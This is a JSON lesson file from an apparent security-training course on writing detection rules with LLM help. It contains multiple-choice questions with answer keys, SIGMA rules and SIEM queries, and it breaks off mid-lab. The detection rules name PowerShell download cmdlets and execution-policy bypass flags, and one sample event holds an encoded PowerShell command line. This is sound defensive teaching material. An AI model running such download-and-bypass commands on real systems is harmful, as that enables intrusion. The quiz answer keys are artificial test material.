{
  "lesson_id": "f1a2b3c4-d5e6-4f7a-b8c9-d0e1f2a3b4c5",
  "domain": "blue_team",
  "title": "Detection-as-Code with LLMs",
  "difficulty": 2,
  "order_index": 133,
  "prerequisites": [],
  "concepts": [
    "Detection engineering principles",
    "Detection-as-Code (DaC) methodology",
    "LLM-assisted detection development",
    "SIGMA rule generation with AI",
    "KQL query synthesis",
    "SPL (Splunk) query generation",
    "Detection pipeline automation",
    "False positive reduction with LLMs",
    "Threat intelligence to detection translation",
    "Detection validation and testing"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Detection-as-Code principles and how LLMs accelerate detection engineering",
    "Use LLMs (ChatGPT, Claude, GitHub Copilot) to generate SIGMA rules from threat descriptions",
    "Translate SIGMA rules to platform-specific queries (KQL, SPL, Elastic Query DSL)",
    "Generate detection logic from ATT&CK techniques and threat intelligence reports",
    "Validate and test LLM-generated detections with sample data",
    "Build detection pipelines that integrate LLM generation with version control",
    "Reduce false positives using LLM-powered query refinement",
    "Implement continuous detection improvement workflows with AI assistance"
  ],
  "post_assessment": [
    {
      "question_id": "dac-llm-001",
      "question": "What is the primary advantage of using Detection-as-Code (DaC) methodology?",
      "options": [
        "Detections run faster in production",
        "Detections are version-controlled, testable, and reproducible",
        "Detections require less computational resources",
        "Detections automatically update when threats evolve"
      ],
      "correct_answer": 1,
      "explanation": "Detection-as-Code treats detection rules as codeâ€”stored in Git, versioned, peer-reviewed, tested with CI/CD pipelines, and reproducibly deployed. This enables collaboration, auditability, and rapid iteration. While LLMs help generate the code, the DaC methodology ensures detections are treated with software engineering rigor.",
      "type": "multiple_choice",
      "difficulty": 1
    },
    {
      "question_id": "dac-llm-002",
      "question": "When using an LLM to generate a SIGMA rule from a threat description, what is the most critical validation step?",
      "options": [
        "Check that the SIGMA syntax is valid YAML",
        "Test the rule against benign data to measure false positive rate",
        "Verify the rule logic matches the threat behavior described",
        "Ensure the rule has proper metadata (author, date, references)"
      ],
      "correct_answer": 2,
      "explanation": "While syntax validity, false positive testing, and metadata are all important, the MOST critical step is verifying that the LLM-generated rule logic actually detects the threat behavior you described. LLMs can produce syntactically correct but logically incorrect rules. Always validate: Does this rule detect what I asked for? Test with known-malicious samples.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "dac-llm-003",
      "question": "Which prompt engineering technique produces the most accurate SIGMA rules from LLMs?",
      "options": [
        "Simple prompt: 'Write a SIGMA rule for PowerShell execution'",
        "Detailed prompt with context: 'Write a SIGMA rule to detect encoded PowerShell commands with suspicious cmdlets like Invoke-WebRequest, bypassing execution policy, targeting Windows Security event log 4688 (process creation)'",
        "Chain-of-thought prompt: 'Explain the threat, then write the SIGMA rule'",
        "Few-shot prompt: Provide 3 example SIGMA rules, then ask for a new one"
      ],
      "correct_answer": 1,
      "explanation": "Detailed, context-rich prompts produce the best results for detection generation. Specify: threat behavior, data source (event log, process creation, network traffic), detection logic (encoded commands, suspicious cmdlets), and evasion techniques (execution policy bypass). Simple prompts yield generic rules. Chain-of-thought helps but takes longer. Few-shot is powerful but requires curating good examples.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "dac-llm-004",
      "question": "What is a 'SIGMA rule' and why is it valuable for Detection-as-Code?",
      "options": [
        "A proprietary detection format owned by Splunk",
        "A vendor-neutral, open-source detection format that can be converted to any SIEM query language",
        "A machine learning model that detects anomalies in log data",
        "A Python library for parsing security event logs"
      ],
      "correct_answer": 1,
      "explanation": "SIGMA is an open-source, vendor-neutral detection rule format (YAML-based) that can be converted to platform-specific queries (Splunk SPL, Microsoft KQL, Elastic Query DSL, QRadar AQL, etc.) using sigmac or pySigma. This makes detections portable across SIEMs, avoiding vendor lock-in. LLMs excel at generating SIGMA rules because the format is well-documented and widely used.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "dac-llm-005",
      "question": "When using LLMs to reduce false positives in an existing detection rule, which approach is most effective?",
      "options": [
        "Ask the LLM: 'Make this rule better'",
        "Provide false positive examples and ask: 'Add exclusions to filter these benign events while keeping true positives'",
        "Regenerate the entire rule from scratch with LLM",
        "Use LLM to analyze all logs and identify patterns automatically"
      ],
      "correct_answer": 1,
      "explanation": "The most effective approach is to provide concrete false positive examples (actual benign events triggering the rule) and ask the LLM to add precise exclusion logic. Example: 'This rule fires on legitimate svchost.exe activity from C:\\Windows\\System32. Add an exclusion for signed Microsoft binaries in that path.' LLMs excel at surgical refinements when given specific data. Generic prompts ('make it better') or full regeneration lose context.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to the Future of Detection Engineering!\n\nImagine writing a detection rule in natural languageâ€”\"Detect when PowerShell downloads and executes a file from the internet\"â€”and having an AI generate a production-ready SIGMA rule in 10 seconds. That future is now.\n\nDetection engineering has always been a bottleneck: threat intelligence reports pile up, new ATT&CK techniques emerge weekly, and security teams struggle to translate abstract threat descriptions into concrete detection logic. Writing rules manually is slow, error-prone, and doesn't scale.\n\nLarge Language Models (LLMs) like ChatGPT, Claude, and GitHub Copilot are transforming detection engineering. They can:\n- Generate SIGMA rules from plain English threat descriptions\n- Translate SIGMA rules to any SIEM query language (KQL, SPL, Elastic)\n- Refine existing rules to reduce false positives\n- Convert threat intelligence reports into actionable detections\n- Explain detection logic in human-readable terms\n\nThis lesson will teach you **Detection-as-Code (DaC)** principles and show you how to leverage LLMs to become a 10x detection engineer. By the end, you'll be generating, testing, and deploying detections faster than you ever thought possible.\n\nLet's revolutionize detection engineering together! ğŸš€"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# What is Detection-as-Code?\n\n## The Problem with Traditional Detection Engineering\n\nTraditionally, detection engineering looks like this:\n\n1. **Read threat intel report**: \"APT29 uses encoded PowerShell to download Cobalt Strike beacons\"\n2. **Manually write SIEM query**: Spend 30-60 minutes crafting a Splunk SPL or KQL query\n3. **Test in production**: Deploy to SIEM, wait for alerts, realize false positive rate is 80%\n4. **Tune manually**: Spend hours adding exclusions, refining logic\n5. **Document (maybe)**: Write detection logic in a Word doc that gets lost\n6. **Repeat for next threat**: Start from scratch\n\n**Problems**:\n- **Slow**: Takes hours per detection\n- **Error-prone**: Manual queries have bugs (syntax errors, logic flaws)\n- **Not reproducible**: No version control, testing, or peer review\n- **Vendor lock-in**: Splunk queries don't work in Sentinel, Elastic, or QRadar\n- **Knowledge loss**: When engineer leaves, tribal knowledge disappears\n\n## Detection-as-Code (DaC): Treating Detections Like Software\n\nDetection-as-Code applies software engineering principles to detection development:\n\n**Core Principles**:\n\n1. **Version Control**: Store detections in Git (GitHub, GitLab)\n2. **Peer Review**: Pull requests for new detections\n3. **Testing**: CI/CD pipelines validate detections with sample data\n4. **Documentation**: Detection metadata (author, ATT&CK mapping, references)\n5. **Portability**: Use vendor-neutral formats (SIGMA) that translate to any SIEM\n6. **Automation**: Deploy detections programmatically via APIs\n\n**Benefits**:\n- **Speed**: Reuse detections, templates, and automation\n- **Quality**: Peer review catches errors before production\n- **Auditability**: Git history shows who changed what, when, and why\n- **Collaboration**: Teams contribute to shared detection repository\n- **Portability**: Switch SIEMs without rewriting all detections\n\n## How LLMs Supercharge Detection-as-Code\n\nLLMs act as **AI co-pilots** for detection engineers:\n\n**LLM Capabilities for Detection Engineering**:\n\n1. **Natural Language â†’ Detection Rule**\n   - Input: \"Detect Mimikatz credential dumping\"\n   - Output: SIGMA rule with process creation, command-line patterns, LSASS access\n\n2. **Threat Intel Report â†’ Detection Logic**\n   - Input: 10-page APT report describing lateral movement via PsExec\n   - Output: 5 SIGMA rules covering service creation, named pipes, SMB traffic\n\n3. **ATT&CK Technique â†’ Detection**\n   - Input: \"T1059.001 - PowerShell execution\"\n   - Output: SIGMA rule for suspicious PowerShell cmdlets (Invoke-Mimikatz, Invoke-WebRequest)\n\n4. **SIGMA â†’ Platform-Specific Query**\n   - Input: SIGMA rule (vendor-neutral)\n   - Output: KQL for Microsoft Sentinel, SPL for Splunk, Query DSL for Elastic\n\n5. **False Positive Reduction**\n   - Input: \"This rule fires on legitimate svchost.exe activity\"\n   - Output: Refined rule with exclusions for signed Microsoft binaries\n\n6. **Detection Explanation**\n   - Input: Complex SIGMA rule with nested conditions\n   - Output: Plain English explanation of what the rule detects and why\n\n## The SIGMA Format: Universal Detection Language\n\n**SIGMA** is an open-source, vendor-neutral detection rule format (think: \"Snort for SIEM\"). It's YAML-based and can be converted to any SIEM query language.\n\n**Why SIGMA?**\n- **Portable**: Write once, deploy everywhere (Splunk, Sentinel, Elastic, QRadar, Chronicle)\n- **Open Source**: Free, community-driven (5,000+ rules on GitHub)\n- **Well-Documented**: LLMs are trained on SIGMA format (excellent generation quality)\n- **Industry Standard**: Used by MITRE, SOC teams, security vendors\n\n**SIGMA Rule Structure** (simplified):\n\n```yaml\ntitle: Suspicious Encoded PowerShell Execution\nid: 5d41402a-bc4b-2a76-b971-9d911017c592\nstatus: experimental\ndescription: Detects PowerShell execution with encoded commands and suspicious cmdlets\nauthor: Your Name\ndate: 2025-11-11\nmodified: 2025-11-11\nreferences:\n  - https://attack.mitre.org/techniques/T1059/001/\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  product: windows\n  service: security\n  definition: 'Process creation events (Event ID 4688)'\ndetection:\n  selection_img:\n    Image|endswith: '\\\\powershell.exe'\n  selection_cli:\n    CommandLine|contains:\n      - '-EncodedCommand'\n      - '-enc'\n  selection_cmdlet:\n    CommandLine|contains:\n      - 'Invoke-WebRequest'\n      - 'Net.WebClient'\n      - 'DownloadString'\n  condition: selection_img and selection_cli and selection_cmdlet\nfalsepositives:\n  - Legitimate administrative scripts\nlevel: high\n```\n\n**Key Sections**:\n- **Metadata**: Title, description, author, ATT&CK tags\n- **Logsource**: Data source (Windows Security logs, Sysmon, network traffic)\n- **Detection**: Logic using selectors and conditions\n- **False Positives**: Known benign scenarios\n- **Level**: Severity (low, medium, high, critical)\n\n## Converting SIGMA to Platform-Specific Queries\n\nSIGMA rules are converted using **sigmac** (legacy) or **pySigma** (modern Python library).\n\n**Example: SIGMA â†’ Splunk SPL**\n\n```bash\n# Install sigmac\npip install sigma-cli\n\n# Convert SIGMA rule to Splunk SPL\nsigmac -t splunk -c splunk-windows suspicious_powershell.yml\n\n# Output:\n# (Image=\"*\\\\powershell.exe\") AND \n# (CommandLine=\"*-EncodedCommand*\" OR CommandLine=\"*-enc*\") AND \n# (CommandLine=\"*Invoke-WebRequest*\" OR CommandLine=\"*Net.WebClient*\" OR CommandLine=\"*DownloadString*\")\n```\n\n**Example: SIGMA â†’ Microsoft KQL**\n\n```bash\n# Convert to KQL for Microsoft Sentinel\nsigmac -t ala -c ala suspicious_powershell.yml\n\n# Output (KQL):\n# SecurityEvent\n# | where EventID == 4688\n# | where ProcessName endswith \"\\\\powershell.exe\"\n# | where CommandLine contains \"-EncodedCommand\" or CommandLine contains \"-enc\"\n# | where CommandLine contains \"Invoke-WebRequest\" or CommandLine contains \"Net.WebClient\" or CommandLine contains \"DownloadString\"\n```\n\n**Example: SIGMA â†’ Elastic Query DSL**\n\n```bash\n# Convert to Elasticsearch Query DSL\nsigmac -t es-qs suspicious_powershell.yml\n\n# Output (JSON):\n# {\n#   \"query\": {\n#     \"bool\": {\n#       \"must\": [\n#         {\"wildcard\": {\"Image\": \"*\\\\\\\\powershell.exe\"}},\n#         {\"bool\": {\"should\": [\n#           {\"wildcard\": {\"CommandLine\": \"*-EncodedCommand*\"}},\n#           {\"wildcard\": {\"CommandLine\": \"*-enc*\"}}\n#         ]}},\n#         {\"bool\": {\"should\": [\n#           {\"wildcard\": {\"CommandLine\": \"*Invoke-WebRequest*\"}},\n#           {\"wildcard\": {\"CommandLine\": \"*Net.WebClient*\"}},\n#           {\"wildcard\": {\"CommandLine\": \"*DownloadString*\"}}\n#         ]}}\n#       ]\n#     }\n#   }\n# }\n```\n\nSIGMA acts as the \"source code\" for detections. Platform-specific queries are \"compiled binaries.\"\n\n## LLM-Powered Detection Engineering Workflow\n\nHere's the modern Detection-as-Code workflow with LLMs:\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Threat Intelligence                          â”‚\nâ”‚   (APT reports, ATT&CK techniques, CVEs, IOCs)                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚               LLM Prompt (ChatGPT, Claude)                      â”‚\nâ”‚  \"Generate a SIGMA rule to detect T1003.001 (LSASS dumping)\"    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚              LLM Generates SIGMA Rule (YAML)                    â”‚\nâ”‚  - Logsource: Windows Security, Sysmon                          â”‚\nâ”‚  - Detection: Process access to lsass.exe, GrantedAccess 0x1010 â”‚\nâ”‚  - Metadata: ATT&CK tags, references, severity                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚            Human Review & Refinement                            â”‚\nâ”‚  - Validate logic matches threat behavior                       â”‚\nâ”‚  - Add organization-specific exclusions                         â”‚\nâ”‚  - Test with sample data (benign + malicious)                   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚              Save to Git Repository                             â”‚\nâ”‚  rules/windows/process_creation/sigma_lsass_dump.yml            â”‚\nâ”‚  - Version control (Git commit)                                 â”‚\nâ”‚  - Peer review (Pull Request)                                   â”‚\nâ”‚  - CI/CD testing (automated validation)                         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚         Convert SIGMA to Platform Queries                       â”‚\nâ”‚  - Splunk SPL: sigmac -t splunk sigma_lsass_dump.yml            â”‚\nâ”‚  - Microsoft KQL: sigmac -t ala sigma_lsass_dump.yml            â”‚\nâ”‚  - Elastic: sigmac -t es-qs sigma_lsass_dump.yml                â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚            Deploy to SIEM via API                               â”‚\nâ”‚  - Splunk REST API: Create saved search                         â”‚\nâ”‚  - Sentinel API: Create analytics rule                          â”‚\nâ”‚  - Elastic API: Create detection rule                           â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                         â”‚\n                         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚          Monitor, Tune, Iterate                                 â”‚\nâ”‚  - Collect false positives                                      â”‚\nâ”‚  - Use LLM to refine rule: \"Add exclusion for signed binaries\"  â”‚\nâ”‚  - Update Git repo, redeploy                                    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Key Insight**: LLMs accelerate **generation** and **refinement**. Humans provide **context**, **validation**, and **organizational knowledge**.\n\n## LLM Capabilities and Limitations\n\n**What LLMs Excel At**:\n- âœ… Generating syntactically correct SIGMA rules from descriptions\n- âœ… Translating SIGMA to platform-specific queries (KQL, SPL, Elastic)\n- âœ… Explaining detection logic in plain English\n- âœ… Adding exclusion logic based on false positive examples\n- âœ… Mapping threats to ATT&CK techniques\n- âœ… Generating detection ideas from threat intel reports\n- âœ… Refactoring complex queries for readability\n\n**What LLMs Struggle With**:\n- âŒ Understanding your organization's environment (legitimate software, baseline activity)\n- âŒ Accessing proprietary threat intelligence (unless you provide it in prompt)\n- âŒ Testing detections with real data (you must validate)\n- âŒ Knowing if a detection is \"good enough\" (requires human judgment)\n- âŒ Detecting novel threats not in training data (zero-days, custom malware)\n- âŒ Handling ambiguous requirements (\"detect bad PowerShell\" â†’ what's \"bad\"?)\n\n**Best Practice**: LLMs are **assistants**, not replacements. Always **validate** LLM-generated detections with:\n1. Logic review (does this detect the threat?)\n2. Syntax validation (is the SIGMA/query valid?)\n3. Testing with benign data (false positive rate acceptable?)\n4. Testing with malicious data (does it catch known evil?)\n\n## LLM Tools for Detection Engineering\n\n**1. ChatGPT (OpenAI)**\n- **Strengths**: Fast, conversational, good at SIGMA generation\n- **Use Cases**: Ad-hoc detection generation, explaining queries\n- **Limitations**: No code execution, can't test queries, limited context window\n\n**2. Claude (Anthropic)**\n- **Strengths**: Longer context window (200K tokens), nuanced reasoning\n- **Use Cases**: Processing long threat intel reports, complex multi-rule generation\n- **Limitations**: Slower than ChatGPT, no API in all regions\n\n**3. GitHub Copilot**\n- **Strengths**: IDE integration (VS Code), autocompletes SIGMA rules as you type\n- **Use Cases**: Writing detections in your editor, inline suggestions\n- **Limitations**: Requires GitHub subscription, trained on public code only\n\n**4. Custom LLMs (Self-Hosted)**\n- **Strengths**: Full control, can fine-tune on proprietary detections\n- **Use Cases**: Organizations with strict data residency requirements\n- **Limitations**: Requires ML expertise, expensive infrastructure\n\n**Recommended Setup for Detection Engineering**:\n- **ChatGPT/Claude**: Quick generation and brainstorming\n- **GitHub Copilot**: Writing rules in VS Code with autocomplete\n- **Local LLM (Llama 3, Mistral)**: For sensitive environments (air-gapped SOCs)\n\n---\n\nNow that you understand the theory, let's get hands-on with LLM-powered detection generation!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Teach Me Like I'm 10: What is Detection-as-Code with LLMs?\n\nImagine you're a lifeguard at a beach. Your job is to watch for people in trouble and blow your whistle when you see danger.\n\n**Old Way (Manual Detection)**:\n- You write down rules on paper: \"If someone waves their arms and yells 'help,' blow whistle.\"\n- Every lifeguard writes their own rules.\n- When a new danger appears (rip current), you rewrite your rules.\n- No one else can use your rules because they're on paper in your notebook.\n\n**New Way (Detection-as-Code)**:\n- All lifeguards share rules in a computer system (Git).\n- When someone adds a new rule, everyone gets it automatically.\n- You can test rules: \"If we pretend someone is drowning, does this rule work?\"\n- If you switch beaches, your rules come with you (portable).\n\n**LLMs as Your Assistant**:\n- You tell your robot assistant: \"Write a rule to detect when someone is drowning.\"\n- The robot writes: \"If arms waving + head underwater + yelling for help, blow whistle.\"\n- You check the rule (does it make sense?), test it, and save it for all lifeguards.\n\n**Why This Matters**:\n- **Faster**: Robot writes rules in seconds (not hours)\n- **Smarter**: Robot remembers 1000s of dangers from other beaches\n- **Teamwork**: All lifeguards use the same tested rules\n- **Portable**: Rules work at any beach (Splunk, Sentinel, Elastic)\n\nFor cybersecurity:\n- **Beach** = Your network\n- **Lifeguard** = SOC analyst\n- **Danger** = Cyberattacks (malware, hackers)\n- **Whistle** = Security alert\n- **Rules** = Detection rules (SIGMA, KQL, SPL)\n- **Robot Assistant** = LLM (ChatGPT, Claude)\n\nDetection-as-Code with LLMs means: **Write detection rules like software code, store them in Git, and use AI to write rules faster and smarter.** ğŸ–ï¸ğŸ¤–"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On Lab: LLM-Powered Detection Engineering\n\nLet's use LLMs to generate, refine, and deploy detection rules!\n\n## Lab 1: Generate a SIGMA Rule with ChatGPT/Claude\n\n### Scenario\n\nYou read a threat intel report: **\"APT29 uses PowerShell with encoded commands to download Cobalt Strike beacons, bypassing execution policy.\"**\n\nYour task: Generate a SIGMA rule to detect this behavior.\n\n### Step 1: Craft the LLM Prompt\n\n**Prompt Template** (use this with ChatGPT or Claude):\n\n```\nYou are a detection engineer. Generate a SIGMA rule to detect the following threat:\n\nThreat Description:\n- Adversary: APT29\n- Technique: PowerShell execution with encoded commands\n- Behavior: Download and execute Cobalt Strike beacon\n- Evasion: Execution policy bypass (-ExecutionPolicy Bypass)\n- Data Source: Windows Security Event Log 4688 (Process Creation) or Sysmon Event ID 1\n\nRequirements:\n1. Detect PowerShell execution (powershell.exe or pwsh.exe)\n2. Detect encoded command flags (-EncodedCommand, -enc, -e)\n3. Detect execution policy bypass (-ExecutionPolicy Bypass, -ep Bypass)\n4. Detect download cmdlets (Invoke-WebRequest, Net.WebClient, DownloadString)\n5. Include ATT&CK tags (T1059.001 - PowerShell)\n6. Set severity to HIGH\n7. Include references to APT29\n\nGenerate a complete SIGMA rule in YAML format.\n```\n\n### Step 2: LLM Output (Example)\n\nThe LLM generates:\n\n```yaml\ntitle: APT29 Encoded PowerShell with Download and Execution Policy Bypass\nid: 7d41402a-bc4b-2a76-b971-9d911017c593\nstatus: experimental\ndescription: Detects PowerShell execution with encoded commands, execution policy bypass, and download cmdlets, consistent with APT29 Cobalt Strike beacon delivery\nauthor: Detection Engineer\ndate: 2025-11-11\nreferences:\n  - https://attack.mitre.org/groups/G0016/\n  - https://attack.mitre.org/techniques/T1059/001/\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.defense_evasion\n  - attack.t1562.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith:\n      - '\\\\powershell.exe'\n      - '\\\\pwsh.exe'\n  selection_encoded:\n    CommandLine|contains:\n      - '-EncodedCommand'\n      - '-enc '\n      - ' -e '\n  selection_bypass:\n    CommandLine|contains:\n      - '-ExecutionPolicy Bypass'\n      - '-ep Bypass'\n      - '-exec bypass'\n  selection_download:\n    CommandLine|contains:\n      - 'Invoke-WebRequest'\n      - 'Net.WebClient'\n      - 'DownloadString'\n      - 'DownloadFile'\n      - 'iwr '\n      - 'curl '\n  condition: selection_img and selection_encoded and (selection_bypass or selection_download)\nfalsepositives:\n  - Legitimate administrative scripts (should be signed and executed from trusted paths)\n  - Software deployment tools (SCCM, Intune)\nlevel: high\n```\n\n### Step 3: Validate the Rule\n\n**Check 1: Logic Review**\n- âœ… Detects PowerShell execution? Yes (`Image|endswith: powershell.exe`)\n- âœ… Detects encoded commands? Yes (`-EncodedCommand`, `-enc`, `-e`)\n- âœ… Detects execution policy bypass? Yes (`-ep Bypass`)\n- âœ… Detects downloads? Yes (`Invoke-WebRequest`, `Net.WebClient`)\n- âœ… Condition makes sense? Yes (PowerShell + encoded + (bypass OR download))\n\n**Check 2: Syntax Validation**\n\nUse `sigma-cli` to validate YAML syntax:\n\n```bash\n# Install sigma-cli\npip install sigma-cli\n\n# Validate SIGMA rule\nsigma check apt29_powershell.yml\n\n# Output:\n# âœ“ Rule is valid SIGMA format\n# âœ“ All required fields present\n# âœ“ Logsource is recognized\n```\n\n**Check 3: Test with Sample Data**\n\nCreate a test event (simulated Windows Event 4688):\n\n```json\n{\n  \"EventID\": 4688,\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -ep Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==\",\n  \"User\": \"CORP\\\\alice\",\n  \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\"\n}\n```\n\n**Expected Result**: Rule should match (PowerShell + encoded + bypass).\n\n### Step 4: Convert SIGMA to Platform Query\n\n**Convert to Splunk SPL**:\n\n```bash\nsigmac -t splunk -c splunk-windows apt29_powershell.yml\n\n# Output (SPL):\n# index=windows EventCode=4688 \n# (Image=\"*\\\\powershell.exe\" OR Image=\"*\\\\pwsh.exe\") \n# (CommandLine=\"*-EncodedCommand*\" OR CommandLine=\"*-enc *\" OR CommandLine=\"* -e *\") \n# (CommandLine=\"*-ExecutionPolicy Bypass*\" OR CommandLine=\"*-ep Bypass*\" OR CommandLine=\"*-exec bypass*\" OR CommandLine=\"*Invoke-WebRequest*\" OR CommandLine=\"*Net.WebClient*\" OR CommandLine=\"*DownloadString*\")\n```\n\n**Convert to Microsoft KQL (Sentinel)**:\n\n```bash\nsigmac -t ala -c ala apt29_powershell.yml\n\n# Output 